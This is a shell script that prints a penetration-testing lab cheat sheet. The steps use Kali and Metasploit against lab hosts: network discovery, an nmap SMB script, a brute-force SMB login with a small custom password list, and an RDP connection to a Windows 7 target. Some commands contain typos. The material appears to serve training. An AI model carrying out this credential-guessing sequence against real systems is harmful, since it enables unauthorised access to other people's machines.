echo '
--] METASPLOIT FRAMEWORK 29

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133




OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> arp-scan 172.16.14.0/24
OPERATOR    ==> TASK ==> cd /usr/share/nmap/scripts/
OPERATOR    ==> TASK ==> ls smb-os-dicoverty.nse IP_TANGO
OPERATOR    ==> TASK ==> nmap --script=smb-os-dicoverty.nse IP_TANGO
OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use auxiliary/scanner/smb/smb_login
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> set rhosts IP_TANGO
OPERATOR    ==> TASK ==> set smbuser PTBOX
OPERATOR    ==> TASK ==> set threads 3
OPERATOR    ==> TASK ==> nano Pass.lst
OPERATOR    ==> TASK ==> cat <<FCK>> /root/Desktop/pass.lst
                        123456
                        iofjeiorfjoifjeof
                        fwefwfewew
                        pweupweu
                        Aa123456
                        FCK
OPERATOR    ==> TASK ==> set pass_file /root/Desktop/pass.lst 
OPERATOR    ==> TASK ==> run
OPERATOR    ==> TASK ==> nmap -p 3389 -sV IP_TANGO       
OPERATOR    ==> TASK ==> rdesktop  IP_TANGO   



'
read